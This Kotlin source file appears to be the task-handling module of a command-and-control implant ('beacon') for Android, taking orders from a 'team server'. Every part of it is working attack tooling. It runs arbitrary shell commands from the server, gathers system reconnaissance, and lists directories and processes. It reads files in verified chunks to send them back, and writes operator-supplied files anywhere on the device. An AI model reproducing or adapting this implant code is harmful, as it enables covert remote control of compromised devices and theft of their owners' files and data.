package io.umbra.beacon

import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.io.RandomAccessFile
import java.security.MessageDigest
import java.util.concurrent.TimeUnit

/** Executes tasks handed out by the team server. */
object TaskRunner {
    const val MAX_OUTPUT = 900 * 1024

    class Outcome(val code: Long, val out: ByteArray, val err: String) {
        /**
         * Extra RESULT fields (`total`, `offset`, `eof`, `sha256`, ...). The
         * server stores the scalars as task metadata, which is what makes a
         * chunked transfer verifiable.
         */
        val extra: MutableList<Pair<String, Upk>> = mutableListOf()

        fun with(key: String, value: Upk): Outcome {
            extra.add(key to value)
            return this
        }

        fun toValue(taskId: String): Upk.MapV {
            val fields = mutableListOf<Pair<String, Upk>>(
                "id" to Upk.str(taskId),
                "code" to Upk.num(code),
                "out" to Upk.bin(out),
                "err" to Upk.str(err),
            )
            fields.addAll(extra)
            return Upk.map(*fields.toTypedArray())
        }
    }

    fun shell(command: String, timeoutSec: Long): Outcome {
        if (command.isBlank()) return Outcome(1, ByteArray(0), "empty command")
        val limit = timeoutSec.coerceAtLeast(1)
        return try {
            // stderr is merged into stdout so one thread drains both.
            val proc = ProcessBuilder("sh", "-c", command)
                .redirectErrorStream(true)
                .start()
            // The child never reads stdin; closing it makes `cat`-style
            // commands see EOF instead of hanging until the timeout.
            runCatching { proc.outputStream.close() }

            // Drain concurrently. Reading only after waitFor would deadlock on
            // any command that writes more than the pipe buffer (~64 KiB):
            // the child blocks in write() and never exits. The buffer is
            // capped, but reading continues so the child can always finish.
            val sink = ByteArrayOutputStream()
            val reader = Thread {
                val chunk = ByteArray(8192)
                try {
                    proc.inputStream.use { input ->
                        while (true) {
                            val n = input.read(chunk)
                            if (n < 0) break
                            synchronized(sink) {
                                val room = MAX_OUTPUT + 4096 - sink.size()
                                if (room > 0) sink.write(chunk, 0, minOf(n, room))
                            }
                        }
                    }
                } catch (_: IOException) {
                    // Stream closed by destroyForcibly() or a broken pipe.
                }
            }
            reader.isDaemon = true
            reader.start()

            val finished = proc.waitFor(limit, TimeUnit.SECONDS)
            if (!finished) {
                proc.destroyForcibly()
                reader.join(1000)
                return Outcome(124, drained(sink), "timeout after ${limit}s")
            }
            reader.join(2000)
            if (reader.isAlive) {
                return Outcome(proc.exitValue().toLong(), drained(sink), "output reader stalled")
            }
            Outcome(proc.exitValue().toLong(), drained(sink), "")
        } catch (t: Throwable) {
            Outcome(127, ByteArray(0), "exec failed: ${t.message}")
        }
    }

    /** Snapshot the drained output, truncating with a marker past MAX_OUTPUT. */
    private fun drained(sink: ByteArrayOutputStream): ByteArray {
        val all = synchronized(sink) { sink.toByteArray() }
        if (all.size <= MAX_OUTPUT) return all
        return all.copyOfRange(0, MAX_OUTPUT) + "\n[umbra: output truncated]\n".toByteArray()
    }

    fun run(kind: String, args: Upk): Outcome {
        val path = args.field("path")?.text() ?: ""
        return when (kind) {
            "shell", "exec" -> shell(
                args.field("cmd")?.text() ?: "",
                args.field("timeout")?.long() ?: 60,
            )
            "sysinfo", "recon" -> Outcome(0, SysInfo.report().toByteArray(), "")
            "ls" -> listDir(if (path.isEmpty()) "/" else path)
            "download", "cat" -> download(
                path,
                args.field("offset")?.long() ?: 0,
                args.field("limit")?.long() ?: MAX_OUTPUT.toLong(),
            )
            "upload" -> upload(
                path,
                args.field("data")?.bytes() ?: ByteArray(0),
                args.field("offset")?.long() ?: 0,
                args.field("eof")?.flag() ?: true,
            )
            "ps" -> processList()
            "sleep" -> Outcome(0, "sleep interval updated\n".toByteArray(), "")
            "exit", "kill" -> Outcome(0, "beacon exiting\n".toByteArray(), "")
            "ping" -> Outcome(0, "pong\n".toByteArray(), "")
            else -> Outcome(2, ByteArray(0), "unknown task kind \"$kind\"")
        }
    }

    /**
     * Read one chunk of a file, mirroring implant/rust/src/task.rs.
     *
     * `total`, `offset`, `eof` and a per-chunk SHA-256 make a multi-request
     * transfer verifiable instead of hopeful.
     */
    fun download(path: String, offset: Long, limit: Long): Outcome {
        if (path.isEmpty()) return Outcome(1, ByteArray(0), "download requires path")
        val size = limit.coerceIn(1, MAX_OUTPUT.toLong()).toInt()
        return try {
            val file = File(path)
            if (file.isDirectory) return Outcome(1, ByteArray(0), "download $path: is a directory")
            val total = file.length()
            if (offset > total) {
                return Outcome(1, ByteArray(0), "download $path: offset $offset past end ($total)")
            }
            val chunk = RandomAccessFile(file, "r").use { raf ->
                raf.seek(offset)
                val buf = ByteArray(minOf(size.toLong(), total - offset).toInt())
                var read = 0
                while (read < buf.size) {
                    val n = raf.read(buf, read, buf.size - read)
                    if (n < 0) break
                    read += n
                }
                if (read == buf.size) buf else buf.copyOfRange(0, read)
            }
            val eof = offset + chunk.size >= total
            Outcome(0, chunk, "")
                .with("total", Upk.num(total))
                .with("offset", Upk.num(offset))
                .with("eof", Upk.bool(eof))
                .with("sha256", Upk.str(sha256Hex(chunk)))
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "download: ${t.message}")
        }
    }

    /**
     * Write one chunk at `offset`; offset 0 truncates, so re-sending a shorter
     * file cannot leave the previous tail behind. The final chunk reports the
     * whole-file hash.
     */
    fun upload(path: String, data: ByteArray, offset: Long, eof: Boolean): Outcome {
        if (path.isEmpty()) return Outcome(1, ByteArray(0), "upload requires path")
        return try {
            RandomAccessFile(File(path), "rw").use { raf ->
                if (offset == 0L) raf.setLength(0)
                raf.seek(offset)
                raf.write(data)
            }
            val written = offset + data.size
            val outcome = Outcome(0, "wrote ${data.size} bytes at offset $offset to $path\n".toByteArray(), "")
                .with("written", Upk.num(written))
                .with("eof", Upk.bool(eof))
            if (eof) {
                val whole = File(path).readBytes()
                outcome
                    .with("total", Upk.num(whole.size.toLong()))
                    .with("sha256", Upk.str(sha256Hex(whole)))
            } else {
                outcome
            }
        } catch (t: Throwable) {
            Outcome(1, ByteArray(0), "upload: ${t.message}")
        }
    }

    private fun sha256Hex(data: ByteArray): String {
        val digest = MessageDigest.getInstance("SHA-256").digest(data)
        val sb = StringBuilder(digest.size * 2)
        for (b in digest) sb.append("%02x".format(b.toInt() and 0xff))
        return sb.toString()
    }

    /**
     * Best-effort process list. Android restricts /proc to the app's own uid on
     * modern releases, so this degrades to whatever is visible and says so.
     */
    private fun processList(): Outcome = try {
        val proc = File("/proc")
        val pids = proc.listFiles { f -> f.name.all { it.isDigit() } } ?: return Outcome(1, ByteArray(0), "ps: /proc not readable")
        val sb = StringBuilder()
        var visible = 0
        pids.mapNotNull { it.name.toIntOrNull() }.sorted().forEach { pid ->
            val cmdline = try {
                File("/proc/$pid/cmdline").readBytes().toString(Charsets.UTF_8).replace('\u0000', ' ').trim()
            } catch (_: Throwable) {
                ""
            }
            if (cmdline.isNotEmpty()) {
                visible += 1
                sb.append("%d %s%n".format(pid, cmdline))
            }
        }
        if (visible == 0) sb.append("ps: process list restricted by the platform\n")
        Outcome(0, sb.toString().toByteArray(), "")
    } catch (t: Throwable) {
        Outcome(1, ByteArray(0), "ps: ${t.message}")
    }

    private fun listDir(path: String): Outcome = try {
        val dir = File(path)
        val entries = dir.listFiles() ?: return Outcome(1, ByteArray(0), "not a directory: $path")
        val sb = StringBuilder()
        entries.sortedBy { it.name }.forEach { f ->
            val kind = if (f.isDirectory) "d" else "-"
            sb.append("%s %12d %s%n".format(kind, f.length(), f.absolutePath))
        }
        Outcome(0, sb.toString().toByteArray(), "")
    } catch (t: Throwable) {
        Outcome(1, ByteArray(0), "ls: ${t.message}")
    }
}
